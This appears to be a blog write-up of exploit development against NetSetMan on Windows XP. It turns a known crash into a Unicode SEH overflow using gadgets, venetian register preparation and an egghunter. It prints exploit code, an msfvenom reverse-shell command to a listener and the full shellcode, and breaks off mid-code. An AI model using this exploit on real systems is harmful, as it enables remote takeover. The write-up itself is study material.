---
layout: post
title: From DoS to SEH Overflow with Unicode
date: '2019-03-14T17:57:00.000-07:00'
author: Keramas
tags: 
modified_time: '2019-03-14T17:57:04.313-07:00'
thumbnail: https://3.bp.blogspot.com/-y7JAGUm0A3I/XIrOXkeRfiI/AAAAAAAAA1o/8LmWrWb4f_YIMZXyTFCR1mFo_4fGK6j-QCEwYBhgL/s72-c/netsetman_window.png
blogger_id: tag:blogger.com,1999:blog-4206503528938574504.post-7875284568750618412
blogger_orig_url: https://k3ramas.blogspot.com/2019/03/from-dos-to-seh-overflow-with-unicode.html
---

I decided to challenge myself the other day to find a DoS proof-of-concept on Exploit DB and find a way to exploit it so arbitrary shellcode is executed (i.e., get a shell) on a Windows XP SP3 machine. Browsing some of the more recent DoS PoCs, I came upon one which looked rather interesting and stayed up all night developing an exploit for it.<br /><br />NetSetMan is "a network settings manager software which can easily switch between your preconfigured profiles" and it suffers from a buffer overflow vulnerability. The original PoC for the DoS can be found <a href="https://www.exploit-db.com/exploits/46417">here</a>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-y7JAGUm0A3I/XIrOXkeRfiI/AAAAAAAAA1o/8LmWrWb4f_YIMZXyTFCR1mFo_4fGK6j-QCEwYBhgL/s1600/netsetman_window.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="464" data-original-width="648" height="457" src="https://3.bp.blogspot.com/-y7JAGUm0A3I/XIrOXkeRfiI/AAAAAAAAA1o/8LmWrWb4f_YIMZXyTFCR1mFo_4fGK6j-QCEwYBhgL/s640/netsetman_window.png" width="640" /></a></div><br />Loading up the program and attaching it to Immunity, I followed the DoS PoC and copied a long string of A's into the "Workgroup" field after enabling it, hit "Activate", and took note of the overflow.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-XjJfvlE9YmU/XIrOXos5HBI/AAAAAAAAA1s/myqDn2j8lZsYpCtPL8AzS6uI6eRqYAYdgCEwYBhgL/s1600/crash_result.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1119" data-original-width="719" src="https://3.bp.blogspot.com/-XjJfvlE9YmU/XIrOXos5HBI/AAAAAAAAA1s/myqDn2j8lZsYpCtPL8AzS6uI6eRqYAYdgCEwYBhgL/s1600/crash_result.png" /></a></div><br />Looks good. It's a standard exception handler (SEH) overflow, but there is a bit of a twist. The overwritten value of the SEH is showing to be 0x00410041 instead of the normal 0x41414141. This means that our input is being converted and stored as unicode and things are about to get a little bit difficult...<br /><br />The first step is to see if there is a POP-POP-RET gadget in a module without SafeSEH enabled that has a memory address that would fit unicode. Meaning, it needs to be in the "0x00XX00XX" format. Using Mona, I found that there were a decent amount of candidates all within the 'netsetman.exe' module.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-2r3eQRyBQ98/XIrQdioNwBI/AAAAAAAAA2k/IttWLxMvGOwSsK7M_Yf9R27rSkTETIfCACLcBGAs/s1600/gadgets.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1140" data-original-width="1342" src="https://2.bp.blogspot.com/-2r3eQRyBQ98/XIrQdioNwBI/AAAAAAAAA2k/IttWLxMvGOwSsK7M_Yf9R27rSkTETIfCACLcBGAs/s1600/gadgets.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br />The catch here, as you will see in a moment, is that it will take a bit of trial and error to find an address that works properly once it comes time to jump to our shellcode. (The image below shows the actual address I ended up using: 0x00590058.)<br /><br />After finding the proper offset to the SEH overwrite and adding a gadget address to the exploit PoC, I set a break point on it, and then pasted in the exploit content.<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-PjUx_IEtCAk/XIrOYdGicvI/AAAAAAAAA2Y/7k9Z8c3RrfQnZhM3YrVYzwdUKrzV-VcKgCPcBGAYYCw/s1600/poppopret_breakpoint.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="53" data-original-width="329" src="https://1.bp.blogspot.com/-PjUx_IEtCAk/XIrOYdGicvI/AAAAAAAAA2Y/7k9Z8c3RrfQnZhM3YrVYzwdUKrzV-VcKgCPcBGAYYCw/s1600/poppopret_breakpoint.png" /></a></div><exploit script=""></exploit><br />Hitting the breakpoint and stepping through the instructions we are back at the buffer and need to step over the SEH somehow. Unfortunately, since our input is going to be converted into unicode, it is not possible to introduce instructions to perform a short jump over it, so instead, we need to find some benign shellcode (assembly instructions) that when interpreted will not cause any errors and allow us to walk over into the buffer. However, this means that the gadget address ALSO needs to translate out into instructions that do not cause an error.<br /><br />It took a good amount of hunting and trial and error, but I discovered that the following instructions would work:<br /><br /><!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1<br />2<br />3<br />4<br />5<br />6<br />7<br />8</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #008000">buffer</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x61</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">75</span> <span style="color: #408080; font-style: italic">#junk</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">1</span>  <span style="color: #408080; font-style: italic">#nop</span><br /><br /><span style="color: #408080; font-style: italic">#0x00590058 : pop ebx # pop ebp # ret 0x08 | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [netsetman.exe]</span><br /><span style="color: #408080; font-style: italic">#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.7.1.0 (C:\Program Files\NetSetMan\netsetman.exe)</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x58\x59</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#SEH overwrite to pop-pop-ret instruction</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x41</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">200</span><br /></pre></td></tr></table></div><br />You can see what kind of instructions they translated to here:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-eqKoeYa0sFQ/XIrOa1KxM1I/AAAAAAAAA2c/RmxugA0jviMsq_2NEqarOIe3zjjpr2nCgCEwYBhgL/s1600/walktoshellcode.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="76" data-original-width="958" src="https://4.bp.blogspot.com/-eqKoeYa0sFQ/XIrOa1KxM1I/AAAAAAAAA2c/RmxugA0jviMsq_2NEqarOIe3zjjpr2nCgCEwYBhgL/s1600/walktoshellcode.png" /></a></div><br />This allows us to waltz right to where our reverse shell payload should go. Everything seems good, but what to do about the payload? Luckily, msfvenom has a nice unicode encoder, but there is yet another catch here. In order for it to decode properly, we need to point a register to the beginning of the shellcode (in this case I used the EAX register), and in order to accomplish this we are going to need to perform some register preparation. Since this cannot be done normally due to the whole unicode issue, I employed the venetian shellcode technique to get the registers set up.<br /><br /><!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22</pre></td><td><pre style="margin: 0; line-height: 125%">regPrep <span style="color: #666666">=</span> (<br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x63</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x55</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#push ebp</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x58</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#pop eax</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x05\x14\x11</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#add eax, 0x11001400</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x2d\x13\x11</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#sub eax, 0x11001300</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x50</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#push eax</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\xc3</span><span style="color: #BA2121">&quot;</span>) <span style="color: #408080; font-style: italic">#ret</span><br /><br /><span style="color: #008000">buffer</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x61</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">75</span> <span style="color: #408080; font-style: italic">#junk</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">1</span>  <span style="color: #408080; font-style: italic">#nop</span><br /><br /><span style="color: #408080; font-style: italic">#0x00590058 : pop ebx # pop ebp # ret 0x08 | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [netsetman.exe]</span><br /><span style="color: #408080; font-style: italic">#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.7.1.0 (C:\Program Files\NetSetMan\netsetman.exe)</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x58\x59</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#SEH overwrite to pop-pop-ret instruction</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> regPrep<br /></pre></td></tr></table></div><br />Once again, the following illustrates what the instructions look like once everything is converted to unicode.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-u4j5EYralCY/XIrOZaGlk4I/AAAAAAAAA2Q/WZMWcD6hmPg5z8D_TCrkjtVEFjv4_n5UACEwYBhgL/s1600/reg_prep.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="225" data-original-width="949" src="https://4.bp.blogspot.com/-u4j5EYralCY/XIrOZaGlk4I/AAAAAAAAA2Q/WZMWcD6hmPg5z8D_TCrkjtVEFjv4_n5UACEwYBhgL/s1600/reg_prep.png" /></a></div><br />Creating a reverse shell with msfvenom and the unicode encoder, I dropped that into the script after the regPrep and ran it.<br /><br />EAX has been set nicely and everything seems good until...<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-1yd0G5SzaHA/XIrOYLNzXkI/AAAAAAAAA2U/YTK10H557cA4ZAXo3wzH-lcQByrcdtorgCEwYBhgL/s1600/outofmemory.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="179" data-original-width="952" height="120" src="https://3.bp.blogspot.com/-1yd0G5SzaHA/XIrOYLNzXkI/AAAAAAAAA2U/YTK10H557cA4ZAXo3wzH-lcQByrcdtorgCEwYBhgL/s640/outofmemory.png" width="640" /></a></div><br />The buffer is too small to fit the reverse shell payload! Now it's time to get a bit creative. While a payload of that size couldn't fit, an egghunter payload sure could. Now I just had to determine if there was a way to get an egg and the reverse shell payload into memory somehow. I modified the script to perform some tests.<br /><br />Placing this payload into each of the input sections and searching through memory for my egg, I determined that another tab's "Workgroup" field allowed for the payload to be placed in memory and it was possible to reach it fully intact. Additionally, the payload was stored as ASCII as well removing the need for unicode encoding.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-FxvzugK_M6U/XIrOXmoeO6I/AAAAAAAAA2M/sIdpieNLvUYgTcYUaPumgp2KMzba2ovMACEwYBhgL/s1600/eggfound.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="256" data-original-width="594" src="https://4.bp.blogspot.com/-FxvzugK_M6U/XIrOXmoeO6I/AAAAAAAAA2M/sIdpieNLvUYgTcYUaPumgp2KMzba2ovMACEwYBhgL/s1600/eggfound.png" /></a></div><br />Creating an alphanumeric encoded reverse shell payload with msfvenom, I tested it out hoping for a shell, but got an error...<br /><br />Oops, we have bad characters that are breaking our code. While this is already an alphanumeric payload, the first couple of bytes are not, and they are for the decoder so it can point to where the shellcode can be decoded (see my <a href="https://k3ramas.blogspot.com/2018/10/non-alphanumeric-characters-in-my.html">previous blog</a> on this). Luckily since we are using an egghunter and EDI is pointing to our code, we can tell msfvenom to use this register and eliminate the need for the non-alphanumeric bytes in the shellcode.<br /><br />Recreating the payload with this flag set, it's time to test it out again.<br /><br /><!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1</pre></td><td><pre style="margin: 0; line-height: 125%">msfvenom -p windows/shell_reverse_tcp <span style="color: #19177C">LHOST</span><span style="color: #666666">=</span>192.168.10.46 <span style="color: #19177C">LPORT</span><span style="color: #666666">=</span>4444 -e x86/alpha_mixed -f python -v shellcode <span style="color: #19177C">EXITFUNC</span><span style="color: #666666">=</span>seh <span style="color: #19177C">BufferRegister</span><span style="color: #666666">=</span>EDI<br /></pre></td></tr></table></div><br />Final PoC:<br /><br /><!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">shellcode <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;w00tw00t&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x42\x75\x4a\x49\x6b\x4c\x6a\x48\x4d\x52\x75\x50</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x63\x30\x37\x70\x63\x50\x4f\x79\x7a\x45\x74\x71</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x39\x50\x45\x34\x6e\x6b\x36\x30\x30\x30\x6c\x4b</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x56\x32\x46\x6c\x6e\x6b\x71\x42\x65\x44\x4e\x6b</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x31\x62\x44\x68\x46\x6f\x6c\x77\x63\x7a\x45\x76</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x65\x61\x39\x6f\x4c\x6c\x75\x6c\x33\x51\x43\x4c</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x54\x42\x54\x6c\x65\x70\x59\x51\x6a\x6f\x46\x6d</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x57\x71\x6f\x37\x48\x62\x6a\x52\x72\x72\x63\x67</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x6c\x4b\x31\x42\x72\x30\x4c\x4b\x50\x4a\x37\x4c</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4c\x4b\x50\x4c\x66\x71\x64\x38\x39\x73\x32\x68</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x43\x31\x4a\x71\x46\x31\x6c\x4b\x51\x49\x55\x70</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x65\x51\x58\x53\x4c\x4b\x67\x39\x34\x58\x59\x73</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x44\x7a\x33\x79\x4c\x4b\x50\x34\x4c\x4b\x57\x71</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x6b\x66\x54\x71\x39\x6f\x4c\x6c\x69\x51\x68\x4f</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x76\x6d\x47\x71\x4f\x37\x65\x68\x39\x70\x71\x65</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x58\x76\x64\x43\x61\x6d\x48\x78\x45\x6b\x71\x6d</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x76\x44\x51\x65\x38\x64\x52\x78\x6e\x6b\x53\x68</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x45\x74\x65\x51\x6a\x73\x31\x76\x6c\x4b\x34\x4c</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62\x6b\x4e\x6b\x32\x78\x75\x4c\x46\x61\x4b\x63</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4e\x6b\x66\x64\x4e\x6b\x55\x51\x58\x50\x6f\x79</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x52\x64\x57\x54\x66\x44\x71\x4b\x53\x6b\x71\x71</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x51\x49\x71\x4a\x53\x61\x69\x6f\x39\x70\x61\x4f</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x43\x6f\x42\x7a\x6e\x6b\x42\x32\x5a\x4b\x4c\x4d</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x53\x6d\x30\x68\x45\x63\x54\x72\x65\x50\x67\x70</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x35\x38\x32\x57\x71\x63\x44\x72\x43\x6f\x66\x34</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x32\x48\x70\x4c\x74\x37\x57\x56\x47\x77\x79\x6f</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x69\x45\x6e\x58\x6c\x50\x45\x51\x57\x70\x65\x50</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x34\x69\x39\x54\x71\x44\x62\x70\x62\x48\x35\x79</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4d\x50\x30\x6b\x37\x70\x79\x6f\x48\x55\x76\x30</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x70\x50\x72\x70\x32\x70\x47\x30\x30\x50\x77\x30</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x52\x70\x55\x38\x38\x6a\x56\x6f\x4b\x6f\x6d\x30</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x39\x6f\x69\x45\x6a\x37\x72\x4a\x33\x35\x63\x58</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4b\x70\x59\x38\x35\x5a\x44\x6e\x42\x48\x33\x32</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x53\x30\x64\x51\x61\x4c\x4f\x79\x58\x66\x72\x4a</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x56\x70\x46\x36\x43\x67\x32\x48\x6d\x49\x4f\x55</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x64\x34\x31\x71\x4b\x4f\x78\x55\x6b\x35\x4f\x30</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x64\x34\x76\x6c\x39\x6f\x72\x6e\x44\x48\x63\x45</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x48\x6c\x50\x68\x6c\x30\x6e\x55\x4d\x72\x51\x46</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x79\x6f\x38\x55\x63\x58\x30\x63\x70\x6d\x72\x44</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x47\x70\x6e\x69\x59\x73\x62\x77\x62\x77\x33\x67</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x55\x61\x69\x66\x31\x7a\x46\x72\x33\x69\x72\x76</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x79\x72\x4b\x4d\x55\x36\x39\x57\x67\x34\x35\x74</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x45\x6c\x55\x51\x77\x71\x4c\x4d\x67\x34\x77\x54</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62\x30\x68\x46\x45\x50\x43\x74\x50\x54\x50\x50</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x52\x76\x52\x76\x63\x66\x63\x76\x66\x36\x32\x6e</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x46\x36\x51\x46\x32\x73\x71\x46\x42\x48\x74\x39</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4a\x6c\x67\x4f\x4d\x56\x49\x6f\x79\x45\x6e\x69</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4d\x30\x70\x4e\x73\x66\x52\x66\x39\x6f\x76\x50</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x61\x78\x64\x48\x6f\x77\x67\x6d\x73\x50\x49\x6f</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x69\x45\x6f\x4b\x59\x6e\x54\x4e\x34\x72\x6a\x4a</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x52\x48\x6d\x76\x4d\x45\x6d\x6d\x4f\x6d\x4b\x4f</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x68\x55\x55\x6c\x74\x46\x61\x6c\x57\x7a\x6f\x70</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4b\x4b\x6b\x50\x62\x55\x33\x35\x4d\x6b\x73\x77</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x42\x33\x72\x52\x50\x6f\x53\x5a\x45\x50\x52\x73</span><span style="color: #BA2121">&quot;</span><br />shellcode <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x4b\x4f\x58\x55\x41\x41</span><span style="color: #BA2121">&quot;</span><br /><br /><br /><br />egghunter <span style="color: #666666">=</span>(<br /><span style="color: 